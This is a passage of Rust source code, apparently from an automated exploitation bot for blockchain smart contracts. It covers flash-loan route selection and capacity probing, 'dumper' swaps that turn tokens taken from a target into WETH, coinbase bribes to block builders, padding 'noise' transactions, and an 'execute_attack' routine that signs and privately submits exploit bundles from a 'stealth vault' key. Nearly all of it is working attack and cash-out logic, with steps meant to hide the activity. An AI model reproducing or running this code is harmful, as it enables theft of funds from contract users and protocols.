        Ok(g) => g,
        Err(p) => {
            warn_builder_ranking_throttled(
                "[EXEC] Builder routing cache lock poisoned while writing; recovering.".to_string(),
            );
            p.into_inner()
        }
    };
    *cache_guard = (now, ranked.clone());
    ranked
}

#[derive(Debug, Clone)]
struct DumperSwap {
    token: Address,
    amount_in: U256,
    min_out_wei: U256,
}

#[derive(Debug, Clone, Copy)]
struct FlashLoanExecutionPlan {
    provider: Address,
    token: Address,
    amount: U256,
}

#[derive(Debug, Clone, Copy)]
struct FlashLoanRouteBucket {
    provider: Address,
    token: Address,
    amount: U256,
}

fn revm_u256_to_alloy(value: revm::primitives::U256) -> U256 {
    U256::from_be_bytes(value.to_be_bytes::<32>())
}

fn collapsed_flash_loan_routes(
    chain_weth: Address,
    params: &ExploitParams,
) -> Vec<FlashLoanRouteBucket> {
    let mut by_route = HashMap::<(Address, Address), U256>::new();
    for leg in params
        .flash_loan_legs
        .iter()
        .filter(|leg| !leg.amount.is_zero())
    {
        let token = if leg.token == Address::ZERO {
            chain_weth
        } else {
            leg.token
        };
        let key = (leg.provider, token);
        let entry = by_route.entry(key).or_insert(U256::ZERO);
        *entry = entry.saturating_add(leg.amount);
    }
    let mut out = by_route
        .into_iter()
        .map(|((provider, token), amount)| FlashLoanRouteBucket {
            provider,
            token,
            amount,
        })
        .collect::<Vec<_>>();
    out.sort_by(|a, b| {
        b.amount
            .cmp(&a.amount)
            .then_with(|| a.provider.as_slice().cmp(b.provider.as_slice()))
            .then_with(|| a.token.as_slice().cmp(b.token.as_slice()))
    });
    out
}

fn flash_loan_required(params: &ExploitParams) -> bool {
    if !params.flash_loan_amount.is_zero() {
        return true;
    }
    if params.flash_loan_provider != Address::ZERO {
        return true;
    }
    params
        .flash_loan_legs
        .iter()
        .any(|leg| !leg.amount.is_zero())
}

fn flash_loan_provider_specs_by_address(chain_id: u64) -> HashMap<Address, FlashLoanProviderSpec> {
    crate::protocols::flash_loan::provider_specs_for_chain(chain_id)
        .into_iter()
        .map(|spec| (spec.address, spec))
        .collect()
}

fn insert_provider_from_spec(
    chain_id: u64,
    providers: &mut HashMap<Address, Box<dyn FlashLoanProvider>>,
    spec: &FlashLoanProviderSpec,
) {
    let chain_weth = crate::config::chains::ChainConfig::get(chain_id).weth;
    match spec.kind {
        FlashLoanProviderKind::AaveV3 => {
            providers.insert(
                spec.address,
                Box::new(AaveV3Provider {
                    pool_address: spec.address,
                }),
            );
        }
        FlashLoanProviderKind::BalancerVault => {
            providers.insert(
                spec.address,
                Box::new(BalancerProvider {
                    vault_address: spec.address,
                }),
            );
        }
        FlashLoanProviderKind::UniswapV2Pair => {
            let (Some(token0), Some(token1)) = (spec.token0, spec.token1) else {
                return;
            };
            providers.insert(
                spec.address,
                Box::new(UniswapV2PairProvider {
                    pair_address: spec.address,
                    token0,
                    token1,
                    chain_weth,
                }),
            );
        }
        FlashLoanProviderKind::UniswapV3Pool => {
            let (Some(token0), Some(token1)) = (spec.token0, spec.token1) else {
                return;
            };
            providers.insert(
                spec.address,
                Box::new(UniswapV3PoolProvider {
                    pool_address: spec.address,
                    token0,
                    token1,
                    fee_bps: spec.fee_bps,
                    chain_weth,
                }),
            );
        }
    }
}

fn flash_loan_discovery_tokens(chain_id: u64, params: &ExploitParams) -> Vec<Address> {
    let chain = crate::config::chains::ChainConfig::get(chain_id);
    let mut out = Vec::new();
    if params.flash_loan_token != Address::ZERO {
        out.push(params.flash_loan_token);
    }
    for leg in params
        .flash_loan_legs
        .iter()
        .filter(|leg| !leg.amount.is_zero())
    {
        if leg.token != Address::ZERO {
            out.push(leg.token);
        }
    }
    out.extend(chain.stablecoins.iter().copied());
    out.push(chain.usdc);
    out.retain(|token| *token != Address::ZERO && *token != chain.weth);
    out.sort_by(|a, b| a.as_slice().cmp(b.as_slice()));
    out.dedup();
    out
}

fn push_flash_loan_plan_candidate(
    out: &mut Vec<FlashLoanExecutionPlan>,
    providers: &HashMap<Address, Box<dyn FlashLoanProvider>>,
    probe_target: Address,
    probe_calldata: &AlloyBytes,
    provider: Address,
    token: Address,
    amount: U256,
) {
    if amount.is_zero() {
        return;
    }
    let Some(provider_impl) = providers.get(&provider) else {
        return;
    };
    if provider_impl
        .encode_loan(token, amount, probe_target, probe_calldata.clone())
        .is_err()
    {
        return;
    }
    if out.iter().any(|existing| {
        existing.provider == provider && existing.token == token && existing.amount == amount
    }) {
        return;
    }
    out.push(FlashLoanExecutionPlan {
        provider,
        token,
        amount,
    });
}

fn flash_loan_plan_candidates(
    chain_id: u64,
    providers: &HashMap<Address, Box<dyn FlashLoanProvider>>,
    params: &ExploitParams,
) -> Vec<FlashLoanExecutionPlan> {
    let chain = crate::config::chains::ChainConfig::get(chain_id);
    let leg_routes = collapsed_flash_loan_routes(chain.weth, params);
    if leg_routes.len() > 1 {
        // Current execution path can wrap only one flash-loan route around the first tx.
        return Vec::new();
    }
    let single_leg = leg_routes.first().copied();

    let requested_token = if params.flash_loan_token == Address::ZERO {
        chain.weth
    } else {
        params.flash_loan_token
    };
    let fallback_amount = if !params.flash_loan_amount.is_zero() {
        params.flash_loan_amount
    } else {
        single_leg.map(|leg| leg.amount).unwrap_or(U256::ZERO)
    };
    if fallback_amount.is_zero() {
        return Vec::new();
    }

    let probe_step = params.steps.first();
    let probe_target = probe_step.map(|step| step.target).unwrap_or(Address::ZERO);
    let probe_calldata = probe_step
        .map(|step| step.call_data.clone())
        .unwrap_or_default();

    let mut out = Vec::new();
    if params.flash_loan_provider != Address::ZERO {
        if let Some(leg) = single_leg {
            if leg.provider == params.flash_loan_provider {
                push_flash_loan_plan_candidate(
                    &mut out,
                    providers,
                    probe_target,
                    &probe_calldata,
                    leg.provider,
                    leg.token,
                    leg.amount,
                );
            }
        }
        push_flash_loan_plan_candidate(
            &mut out,
            providers,
            probe_target,
            &probe_calldata,
            params.flash_loan_provider,
            requested_token,
            fallback_amount,
        );
    }

    if let Some(leg) = single_leg {
        push_flash_loan_plan_candidate(
            &mut out,
            providers,
            probe_target,
            &probe_calldata,
            leg.provider,
            leg.token,
            leg.amount,
        );
    }

    let mut ranked = providers.iter().collect::<Vec<_>>();
    ranked.sort_by(|(_, a), (_, b)| {
        a.fee_bps()
            .cmp(&b.fee_bps())
            .then_with(|| a.address().as_slice().cmp(b.address().as_slice()))
    });

    for (provider, _) in &ranked {
        push_flash_loan_plan_candidate(
            &mut out,
            providers,
            probe_target,
            &probe_calldata,
            **provider,
            requested_token,
            fallback_amount,
        );
    }

    if requested_token != chain.weth {
        for (provider, _) in &ranked {
            push_flash_loan_plan_candidate(
                &mut out,
                providers,
                probe_target,
                &probe_calldata,
                **provider,
                chain.weth,
                fallback_amount,
            );
        }
    }

    out
}

fn select_flash_loan_plan(
    chain_id: u64,
    providers: &HashMap<Address, Box<dyn FlashLoanProvider>>,
    params: &ExploitParams,
) -> Option<FlashLoanExecutionPlan> {
    flash_loan_plan_candidates(chain_id, providers, params)
        .into_iter()
        .next()
}

async fn eth_call_with_timeout(
    provider: &RootProvider<Http<Client>>,
    to: Address,
    input: AlloyBytes,
    timeout_ms: u64,
) -> anyhow::Result<AlloyBytes> {
    let request = TransactionRequest::default().with_to(to).with_input(input);
    let raw = tokio::time::timeout(Duration::from_millis(timeout_ms), provider.call(&request))
        .await
        .map_err(|_| anyhow::anyhow!("eth_call timed out after {}ms for to={:#x}", timeout_ms, to))?
        .map_err(|err| anyhow::anyhow!("eth_call failed for to={:#x}: {}", to, err))?;
    Ok(raw)
}

async fn discover_flash_loan_specs_from_factories_uncached(
    chain_id: u64,
    provider: &RootProvider<Http<Client>>,
    existing_specs: &HashMap<Address, FlashLoanProviderSpec>,
    tokens: &[Address],
) -> Vec<FlashLoanProviderSpec> {
    let chain = crate::config::chains::ChainConfig::get(chain_id);
    if tokens.is_empty() {
        return Vec::new();
    }

    let timeout_ms = load_flash_loan_discovery_timeout_ms();
    let v2_factories = load_flash_loan_discovery_v2_factories();
    let v3_factories = load_flash_loan_discovery_v3_factories();
    let v3_fees = load_flash_loan_discovery_v3_fees();

    let mut discovered = Vec::new();
    let mut seen = existing_specs.keys().copied().collect::<HashSet<_>>();

    for factory in &v2_factories {
        for token in tokens {
            let call = IUniswapV2FactoryView::getPairCall {
                tokenA: *token,
                tokenB: chain.weth,
            };
            let Ok(raw) = eth_call_with_timeout(
                provider,
                *factory,
                AlloyBytes::from(call.abi_encode()),
                timeout_ms,
            )
            .await
            else {
                continue;
            };
            let Ok(decoded) = <IUniswapV2FactoryView::getPairCall as SolCall>::abi_decode_returns(
                raw.as_ref(),
                true,
            ) else {
                continue;
            };
            if decoded.pair == Address::ZERO || !seen.insert(decoded.pair) {
                continue;
            }
            discovered.push(FlashLoanProviderSpec {
                address: decoded.pair,
                fee_bps: 30,
                kind: FlashLoanProviderKind::UniswapV2Pair,
                token0: Some(*token),
                token1: Some(chain.weth),
            });
        }
    }

    for factory in &v3_factories {
        for token in tokens {
            for fee_tier in &v3_fees {
                let fee = U24::from(*fee_tier);
                let call = IUniswapV3FactoryView::getPoolCall {
                    tokenA: *token,
                    tokenB: chain.weth,
                    fee,
                };
                let Ok(raw) = eth_call_with_timeout(
                    provider,
                    *factory,
                    AlloyBytes::from(call.abi_encode()),
                    timeout_ms,
                )
                .await
                else {
                    continue;
                };
                let Ok(decoded) =
                    <IUniswapV3FactoryView::getPoolCall as SolCall>::abi_decode_returns(
                        raw.as_ref(),
                        true,
                    )
                else {
                    continue;
                };
                if decoded.pool == Address::ZERO || !seen.insert(decoded.pool) {
                    continue;
                }
                discovered.push(FlashLoanProviderSpec {
                    address: decoded.pool,
                    fee_bps: fee_tier.saturating_div(100),
                    kind: FlashLoanProviderKind::UniswapV3Pool,
                    token0: Some(*token),
                    token1: Some(chain.weth),
                });
            }
        }
    }

    discovered
}

async fn discover_flash_loan_specs_from_factories(
    chain_id: u64,
    provider: &RootProvider<Http<Client>>,
    existing_specs: &HashMap<Address, FlashLoanProviderSpec>,
    params: &ExploitParams,
) -> Vec<FlashLoanProviderSpec> {
    if !load_flash_loan_discovery_enabled() {
        return Vec::new();
    }
    if !flash_loan_required(params) {
        return Vec::new();
    }
    let tokens = flash_loan_discovery_tokens(chain_id, params);
    if tokens.is_empty() {
        return Vec::new();
    }

    let key = flash_loan_discovery_key(chain_id, &tokens);
    let ttl_ms = load_flash_loan_discovery_cache_ttl_ms();
    let now = now_ms();
    {
        let guard = match flash_loan_discovery_cache().lock() {
            Ok(g) => g,
            Err(p) => p.into_inner(),
        };
        if let Some(entry) = guard.get(&key) {
            if now.saturating_sub(entry.fetched_ms) <= ttl_ms {
                return entry.specs.clone();
            }
        }
    }

    let discovered = discover_flash_loan_specs_from_factories_uncached(
        chain_id,
        provider,
        existing_specs,
        &tokens,
    )
    .await;
    let mut guard = match flash_loan_discovery_cache().lock() {
        Ok(g) => g,
        Err(p) => p.into_inner(),
    };
    guard.insert(
        key,
        FlashLoanDiscoveryCacheEntry {
            fetched_ms: now,
            specs: discovered.clone(),
        },
    );
    discovered
}

async fn erc20_balance_of_with_timeout(
    provider: &RootProvider<Http<Client>>,
    token: Address,
    owner: Address,
    timeout_ms: u64,
) -> anyhow::Result<U256> {
    let call = IERC20::balanceOfCall { owner };
    let raw = eth_call_with_timeout(
        provider,
        token,
        AlloyBytes::from(call.abi_encode()),
        timeout_ms,
    )
    .await?;
    let decoded = <IERC20::balanceOfCall as SolCall>::abi_decode_returns(raw.as_ref(), true)
        .map_err(|err| {
            anyhow::anyhow!("balanceOf decode failed for token={:#x}: {}", token, err)
        })?;
    Ok(decoded.balance)
}

async fn probe_flash_loan_provider_capacity(
    provider: &RootProvider<Http<Client>>,
    spec: &FlashLoanProviderSpec,
    token: Address,
    timeout_ms: u64,
) -> anyhow::Result<Option<U256>> {
    if token == Address::ZERO {
        return Ok(None);
    }
    match spec.kind {
        FlashLoanProviderKind::BalancerVault
        | FlashLoanProviderKind::UniswapV2Pair
        | FlashLoanProviderKind::UniswapV3Pool => {
            erc20_balance_of_with_timeout(provider, token, spec.address, timeout_ms)
                .await
                .map(Some)
        }
        FlashLoanProviderKind::AaveV3 => {
            let reserve_call = IAaveV3PoolLiquidity::getReserveDataCall { asset: token };
            let reserve_raw = eth_call_with_timeout(
                provider,
                spec.address,
                AlloyBytes::from(reserve_call.abi_encode()),
                timeout_ms,
            )
            .await?;
            let reserve =
                <IAaveV3PoolLiquidity::getReserveDataCall as SolCall>::abi_decode_returns(
                    reserve_raw.as_ref(),
                    true,
                )
                .map_err(|err| {
                    anyhow::anyhow!(
                        "Aave reserve decode failed for pool={:#x}, token={:#x}: {}",
                        spec.address,
                        token,
                        err
                    )
                })?;
            if reserve.aTokenAddress == Address::ZERO {
                return Ok(None);
            }
            erc20_balance_of_with_timeout(provider, token, reserve.aTokenAddress, timeout_ms)
                .await
                .map(Some)
        }
    }
}

async fn probe_flash_loan_provider_capacity_cached(
    provider: &RootProvider<Http<Client>>,
    spec: &FlashLoanProviderSpec,
    token: Address,
    timeout_ms: u64,
) -> anyhow::Result<Option<U256>> {
    let ttl_ms = load_flash_loan_capacity_cache_ttl_ms();
    let key = (spec.address, token);
    let now = now_ms();
    {
        let guard = match flash_loan_capacity_cache().lock() {
            Ok(g) => g,
            Err(p) => p.into_inner(),
        };
        if let Some(entry) = guard.get(&key) {
            if now.saturating_sub(entry.fetched_ms) <= ttl_ms {
                return Ok(entry.capacity);
            }
        }
    }
    let capacity = probe_flash_loan_provider_capacity(provider, spec, token, timeout_ms).await?;
    let mut guard = match flash_loan_capacity_cache().lock() {
        Ok(g) => g,
        Err(p) => p.into_inner(),
    };
    guard.insert(
        key,
        FlashLoanCapacityCacheEntry {
            fetched_ms: now,
            capacity,
        },
    );
    Ok(capacity)
}

async fn select_flash_loan_plan_with_capacity(
    chain_id: u64,
    provider: &RootProvider<Http<Client>>,
    providers: &HashMap<Address, Box<dyn FlashLoanProvider>>,
    provider_specs: &HashMap<Address, FlashLoanProviderSpec>,
    params: &ExploitParams,
) -> Option<FlashLoanExecutionPlan> {
    let candidates = flash_loan_plan_candidates(chain_id, providers, params);
    if candidates.is_empty() {
        return None;
    }
    if !load_flash_loan_capacity_probe_enabled() {
        return select_flash_loan_plan(chain_id, providers, params);
    }

    let timeout_ms = load_flash_loan_capacity_probe_timeout_ms();
    let strict = load_flash_loan_capacity_probe_strict();
    let mut unknown_fallback = None;

    for candidate in candidates {
        let Some(spec) = provider_specs.get(&candidate.provider) else {
            if unknown_fallback.is_none() {
                unknown_fallback = Some(candidate);
            }
            continue;
        };

        match probe_flash_loan_provider_capacity_cached(provider, spec, candidate.token, timeout_ms)
            .await
        {
            Ok(Some(capacity)) if capacity >= candidate.amount => {
                return Some(candidate);
            }
            Ok(Some(_)) => {
                continue;
            }
            Ok(None) | Err(_) => {
                if unknown_fallback.is_none() {
                    unknown_fallback = Some(candidate);
                }
            }
        }
    }

    if strict {
        None
    } else {
        unknown_fallback
    }
}

fn build_dumper_swaps(
    chain_id: u64,
    token_deltas: &[verifier::TokenBalanceDelta],
    gas_cost_wei: revm::primitives::U256,
) -> Vec<DumperSwap> {
    let chain = crate::config::chains::ChainConfig::get(chain_id);
    let mut candidates = token_deltas
        .iter()
        .filter_map(|delta| {
            if delta.token == chain.weth || delta.final_balance <= delta.initial {
                return None;
            }
            let gathered = delta.final_balance.saturating_sub(delta.initial);
            if gathered.is_zero() {
                return None;
            }
            Some((delta.token, revm_u256_to_alloy(gathered)))
        })
        .collect::<Vec<_>>();
    candidates.sort_by(|(token_a, _), (token_b, _)| token_a.as_slice().cmp(token_b.as_slice()));

    if candidates.is_empty() {
        return Vec::new();
    }

    let candidate_len = candidates.len();
    let mut swaps = candidates
        .into_iter()
        .map(|(token, amount_in)| DumperSwap {
            token,
            amount_in,
            min_out_wei: U256::ZERO,
        })
        .collect::<Vec<_>>();
    if candidate_len > 0 {
        repartition_dumper_min_out(&mut swaps, revm_u256_to_alloy(gas_cost_wei));
    }
    swaps
}

fn repartition_dumper_min_out(swaps: &mut [DumperSwap], total_required: U256) {
    let count = swaps.len();
    if count == 0 {
        return;
    }
    let count_u256 = U256::from(count as u64);
    let per_swap_min_out = total_required / count_u256;
    let remainder = total_required % count_u256;
    for (idx, swap) in swaps.iter_mut().enumerate() {
        swap.min_out_wei = per_swap_min_out;
        if idx + 1 == count {
            swap.min_out_wei = swap.min_out_wei.saturating_add(remainder);
        }
    }
}

fn dumper_min_out_total(swaps: &[DumperSwap]) -> U256 {
    swaps
        .iter()
        .fold(U256::ZERO, |acc, swap| acc.saturating_add(swap.min_out_wei))
}

async fn append_dumper_transactions(
    signer: &PrivateKeySigner,
    chain_id: u64,
    tip: u128,
    max_fee: u128,
    nonce: &mut u64,
    group_txs: &mut Vec<AlloyBytes>,
    swaps: &[DumperSwap],
) -> anyhow::Result<usize> {
    if swaps.is_empty() {
        return Ok(0);
    }

    let chain = crate::config::chains::ChainConfig::get(chain_id);
    let Some((router, is_v3_router)) = get_dumper_router(chain_id) else {
        anyhow::bail!("dumper router is not configured for chain_id={chain_id}");
    };
    let deadline = U256::from((now_ms() / 1000).saturating_add(load_dumper_swap_deadline_secs()));
    let v3_fee = load_dumper_v3_fee();
    let wallet = EthereumWallet::from(signer.clone());
    let before_len = group_txs.len();

    for swap in swaps {
        let approve_calldata = IERC20::approveCall {
            spender: router,
            amount: swap.amount_in,
        }
        .abi_encode();

        let mut approve_tx = TransactionRequest::default()
            .with_to(swap.token)
            .with_input(approve_calldata)
            .with_chain_id(chain_id)
            .with_nonce(*nonce)
            .with_max_priority_fee_per_gas(tip)
            .with_max_fee_per_gas(max_fee);
        approve_tx.from = Some(signer.address());
        let signed_approve = approve_tx.build(&wallet).await.map_err(|err| {
            anyhow::anyhow!("dumper approve signing failed for {:#x}: {err}", swap.token)
        })?;
        group_txs.push(AlloyBytes::from(signed_approve.encoded_2718()));
        *nonce = nonce.saturating_add(1);

        let swap_calldata = if is_v3_router {
            IUniswapV3Router::exactInputSingleCall {
                params: IUniswapV3Router::ExactInputSingleParams {
                    tokenIn: swap.token,
                    tokenOut: chain.weth,
                    fee: v3_fee,
                    recipient: signer.address(),
                    deadline,
                    amountIn: swap.amount_in,
                    amountOutMinimum: swap.min_out_wei,
                    sqrtPriceLimitX96: U160::ZERO,
                },
            }
            .abi_encode()
        } else {
            IUniswapV2Router02::swapExactTokensForTokensCall {
                amountIn: swap.amount_in,
                amountOutMin: swap.min_out_wei,
                path: vec![swap.token, chain.weth],
                to: signer.address(),
                deadline,
            }
            .abi_encode()
        };

        let mut swap_tx = TransactionRequest::default()
            .with_to(router)
            .with_input(swap_calldata)
            .with_chain_id(chain_id)
            .with_nonce(*nonce)
            .with_max_priority_fee_per_gas(tip)
            .with_max_fee_per_gas(max_fee);
        swap_tx.from = Some(signer.address());
        let signed_swap = swap_tx.build(&wallet).await.map_err(|err| {
            anyhow::anyhow!("dumper swap signing failed for {:#x}: {err}", swap.token)
        })?;
        group_txs.push(AlloyBytes::from(signed_swap.encoded_2718()));
        *nonce = nonce.saturating_add(1);
    }

    Ok(group_txs.len().saturating_sub(before_len))
}

async fn append_dumper_native_unwrap_transaction(
    signer: &PrivateKeySigner,
    chain_id: u64,
    tip: u128,
    max_fee: u128,
    nonce: &mut u64,
    group_txs: &mut Vec<AlloyBytes>,
    unwrap_wei: U256,
) -> anyhow::Result<bool> {
    if unwrap_wei.is_zero() {
        return Ok(false);
    }

    let chain = crate::config::chains::ChainConfig::get(chain_id);
    let wallet = EthereumWallet::from(signer.clone());
    let calldata = IWETH9::withdrawCall { wad: unwrap_wei }.abi_encode();
    let mut tx = TransactionRequest::default()
        .with_to(chain.weth)
        .with_input(calldata)
        .with_chain_id(chain_id)
        .with_nonce(*nonce)
        .with_max_priority_fee_per_gas(tip)
        .with_max_fee_per_gas(max_fee);
    tx.from = Some(signer.address());
    let signed = tx
        .build(&wallet)
        .await
        .map_err(|err| anyhow::anyhow!("dumper unwrap signing failed: {err}"))?;
    group_txs.push(AlloyBytes::from(signed.encoded_2718()));
    *nonce = nonce.saturating_add(1);
    Ok(true)
}

async fn append_coinbase_bribe_transaction(
    signer: &PrivateKeySigner,
    chain_id: u64,
    tip: u128,
    max_fee: u128,
    nonce: &mut u64,
    group_txs: &mut Vec<AlloyBytes>,
    bribe_wei: U256,
) -> anyhow::Result<bool> {
    if bribe_wei.is_zero() {
        return Ok(false);
    }
    let Some(bribe_contract) = load_coinbase_bribe_contract() else {
        anyhow::bail!("coinbase bribe requested but COINBASE_BRIBE_CONTRACT is not configured");
    };
    let wallet = EthereumWallet::from(signer.clone());
    let calldata = ICoinbaseBribe::bribeCall {}.abi_encode();
    let mut tx = TransactionRequest::default()
        .with_to(bribe_contract)
        .with_input(calldata)
        .with_value(bribe_wei)
        .with_chain_id(chain_id)
        .with_nonce(*nonce)
        .with_max_priority_fee_per_gas(tip)
        .with_max_fee_per_gas(max_fee);
    tx.from = Some(signer.address());
    let signed = tx
        .build(&wallet)
        .await
        .map_err(|err| anyhow::anyhow!("coinbase bribe tx signing failed: {err}"))?;
    group_txs.push(AlloyBytes::from(signed.encoded_2718()));
    *nonce = nonce.saturating_add(1);
    Ok(true)
}

async fn append_noise_transactions(
    signer: &PrivateKeySigner,
    chain_id: u64,
    block_offset: u64,
    tip: u128,
    max_fee: u128,
    nonce: &mut u64,
    group_txs: &mut Vec<AlloyBytes>,
) {
    let wallet = EthereumWallet::from(signer.clone());
    let noise_count = noise_bundle_tx_count();
    for noise_idx in 0..noise_count {
        let marker = build_noise_marker(block_offset, noise_idx as u64, *nonce);
        let noise_request = TransactionRequest::default()
            .with_to(signer.address())
            .with_input(marker)
            .with_chain_id(chain_id)
            .with_nonce(*nonce)
            .with_max_priority_fee_per_gas(tip)
            .with_max_fee_per_gas(max_fee)
            .with_value(U256::ZERO);

        match noise_request.build(&wallet).await {
            Ok(signed) => {
                group_txs.push(AlloyBytes::from(signed.encoded_2718()));
                *nonce += 1;
            }
            Err(err) => {
                eprintln!(
                    "[WARN] Noise tx signing failed (offset={}, idx={}): {:?}",
                    block_offset, noise_idx, err
                );
            }
        }
    }
}

pub struct Executor {
    signer: Option<PrivateKeySigner>,
    provider: RootProvider<Http<Client>>,
    hydration_pool: crate::utils::rpc::HydrationProviderPool,
    multi_builder: builders::MultiBuilder,
    private_handshake_complete: Mutex<bool>,
    rpc_url: String,
    submission_enabled: bool,
    nonce_cache: Mutex<Option<u64>>,
    gas_opt_cache: Mutex<Option<CachedGasOpt>>,
    pub code_cache: Option<Arc<DashMap<Address, AlloyBytes>>>,
    chain_id: u64,
    pub providers: HashMap<Address, Box<dyn FlashLoanProvider>>,
    flash_loan_provider_specs: HashMap<Address, FlashLoanProviderSpec>,
    coinbase_bribe_route_enabled: bool,
    stealth_vault_min_balance_wei: Option<U256>,
}

struct CachedGasOpt {
    fetched_ms: u64,
    base_fee: u128,
    priority_fee_percentiles: Vec<u128>,
    head_block: Option<u64>,
}

fn summarize_token_deltas(deltas: &[verifier::TokenBalanceDelta]) -> String {
    let mut changed = deltas
        .iter()
        .filter(|delta| delta.final_balance != delta.initial)
        .collect::<Vec<_>>();
    changed.truncate(6);
    if changed.is_empty() {
        return "none".to_string();
    }
    changed
        .into_iter()
        .map(|delta| {
            format!(
                "{:#x}:{}->{}",
                delta.token, delta.initial, delta.final_balance
            )
        })
        .collect::<Vec<_>>()
        .join(", ")
}

impl Executor {
    pub fn new(
        config: &Config,
        code_cache: Option<Arc<DashMap<Address, AlloyBytes>>>,
        _proxy_cache: Option<Arc<DashMap<Address, Address>>>,
    ) -> anyhow::Result<Self> {
        let private_key_hex = config.eth_private_key.clone();
        let submission_enabled = config.submission_enabled;
        let rpc_url = config
            .execution_rpc_url
            .clone()
            .unwrap_or_else(|| config.eth_rpc_url.clone());

        let signer = private_key_hex.and_then(|pk| {
            let clean_pk = crate::utils::hex::clean_hex(&pk);
            if clean_pk.len() != 64 {
                return None;
            }
            PrivateKeySigner::from_str(clean_pk).ok()
        });

        if submission_enabled && signer.is_none() {
            anyhow::bail!(
                "TX_SUBMISSION_ENABLED=true requires a valid ETH_PRIVATE_KEY/STEALTH_VAULT_PRIVATE_KEY signer"
            );
        }

        let provider = ProviderBuilder::new().on_http(rpc_url.parse()?);
        let (hydration_pool, _hydration_urls) =
            crate::utils::rpc::build_hydration_provider_pool(&rpc_url)?;

        let providers = crate::protocols::flash_loan::get_default_providers(config.chain_id);
        let flash_loan_provider_specs = flash_loan_provider_specs_by_address(config.chain_id);
        let builder_urls = resolve_builder_urls(config);
        let coinbase_bribe_route_enabled = has_coinbase_bribe_route(&builder_urls);
        let multi_builder = builders::MultiBuilder::from_urls(&builder_urls);

        Ok(Self {
            signer,
            provider,
            hydration_pool,
            multi_builder,
            private_handshake_complete: Mutex::new(false),
            rpc_url,
            submission_enabled,
            nonce_cache: Mutex::new(None),
            gas_opt_cache: Mutex::new(None),
            code_cache,
            chain_id: config.chain_id,
            providers,
            flash_loan_provider_specs,
            coinbase_bribe_route_enabled,
            stealth_vault_min_balance_wei: config
                .stealth_vault_min_balance_wei
                .as_deref()
                .and_then(|raw| U256::from_str(raw.trim()).ok())
                .filter(|v| !v.is_zero()),
        })
    }

    async fn ensure_private_handshake(&self) -> anyhow::Result<()> {
        if *self.private_handshake_complete.lock().await {
            return Ok(());
        }
        // Never hold the mutex across network await: concurrent workers must remain schedulable.
        self.multi_builder.secure_handshake().await?;
        let mut handshake_done = self.private_handshake_complete.lock().await;
        *handshake_done = true;
        Ok(())
    }

    async fn gas_opt_snapshot(&self) -> gas_solver::GasOptimalitySolver {
        let ttl_ms = load_gas_solver_cache_ttl_ms();
        let now = now_ms();
        if let Some(cached) = self
            .gas_opt_cache
            .lock()
            .await
            .as_ref()
            .filter(|c| now.saturating_sub(c.fetched_ms) <= ttl_ms)
        {
            let mut solver = gas_solver::GasOptimalitySolver::new(
                cached.base_fee,
                cached.priority_fee_percentiles.clone(),
            );
            solver.head_block = cached.head_block;
            return solver;
        }

        let fresh = gas_solver::GasOptimalitySolver::from_provider_url(&self.rpc_url).await;
        let snapshot = CachedGasOpt {
            fetched_ms: now_ms(),
            base_fee: fresh.base_fee,
            priority_fee_percentiles: fresh.priority_fee_percentiles.clone(),
            head_block: fresh.head_block,
        };
        *self.gas_opt_cache.lock().await = Some(snapshot);
        fresh
    }

    pub async fn force_sync_nonce(&self, address: Address) -> anyhow::Result<u64> {
        let mut attempts = 0;
        loop {
            attempts += 1;
            match self.provider.get_transaction_count(address).await {
                Ok(n) => {
                    let mut cache = self.nonce_cache.lock().await;
                    *cache = Some(n);
                    return Ok(n);
                }
                Err(e) => {
                    if attempts >= 3 {
                        anyhow::bail!("Failed to sync nonce: {:?}", e);
                    }
                    tokio::time::sleep(tokio::time::Duration::from_millis(100 * (1 << attempts)))
                        .await;
                }
            }
        }
    }

    pub fn attacker_address(&self) -> Address {
        self.signer
            .as_ref()
            .map(|s| s.address())
            .unwrap_or(crate::solver::setup::ATTACKER)
    }

    pub async fn execute_attack(
        &self,
        params: ExploitParams,
        target: Address,
        ctx: AttackExecutionContext,
    ) -> AttackExecutionFeedback {
        println!("Constructing Bundle (Multi-Builder)...");
        // Safe-mode replay should match the solver's caller model (ATTACKER sentinel).
        let attacker_address = if self.submission_enabled {
            match self.signer.as_ref() {
                Some(signer) => signer.address(),
                None => {
                    eprintln!(
                        "[-] TX_SUBMISSION_ENABLED enabled without signer; refusing payload hardening/execution."
                    );
                    return AttackExecutionFeedback {
                        outcome: AttackOutcome::DroppedPreflight,
                        ..AttackExecutionFeedback::default()
                    };
                }
            }
        } else {
            crate::solver::setup::ATTACKER
        };
        let mut feedback = AttackExecutionFeedback::default();

        let AttackExecutionContext {
            target_solve_block,
            solve_duration_ms,
            require_late_solve_preflight,
            solve_completed_ms,
            tip_auto_scale_contested,
            verified_shadow_report,
        } = ctx;
        let mut tip_auto_scale_contested = tip_auto_scale_contested;

        // Sender+Block pinning needs a stable notion of the intended execution block.
        // This is optional and only active when a pinning anchor contract is configured.
        let mut prefetched_head_block: Option<u64> = None;
        let mut intended_env_block: Option<u64> = None;
        if self.submission_enabled && pinning_anchor::pinning_anchor_active() {
            match RobustRpc::get_block_number_with_retry_ref(&self.provider, 2).await {
                Ok(head) => {
                    if pinning_anchor::pinning_anchor_strict_block_match_enabled()
                        && head != target_solve_block
                    {
                        eprintln!(
                            "[PIN] Dropping pinned payload: head {} != solve_block {} (strict match).",
                            head, target_solve_block
                        );
                        feedback.outcome = AttackOutcome::DroppedStale;
                        return feedback;
                    }
                    prefetched_head_block = Some(head);
                    intended_env_block = Some(head.saturating_add(1));
                }
                Err(err) => {
                    eprintln!(
                        "[-] Failed to fetch head for pinning anchor: {:?}. Dropping bundle.",
                        err
                    );
                    feedback.outcome = AttackOutcome::DroppedPreflight;
                    return feedback;
                }
            }
        }

        let mut params = payload_hardening::harden_exploit_params(params, target, attacker_address);
        params = invariant_anchors::maybe_wrap_with_atomic_invariant_anchor(params, self.chain_id);
        if self.submission_enabled {
            if let Some(env_block) = intended_env_block {
                params = pinning_anchor::maybe_wrap_with_pinning_anchor(
                    params,
                    attacker_address,
                    env_block,
                );
            }
        }
        let params = Arc::new(params);

        if self.submission_enabled {
            if let (Some(signer), Some(min_balance)) =
                (self.signer.as_ref(), self.stealth_vault_min_balance_wei)
            {
                match self.provider.get_balance(signer.address()).await {
                    Ok(balance) if balance < min_balance => {
                        eprintln!(
                            "[VAULT] Stealth vault balance too low: address={:#x} balance={} < min_required={}. Dropping bundle.",
                            signer.address(),
                            balance,
                            min_balance
                        );
                        feedback.outcome = AttackOutcome::DroppedPreflight;
                        return feedback;
                    }
                    Ok(_) => {}
                    Err(err) => {
                        eprintln!(
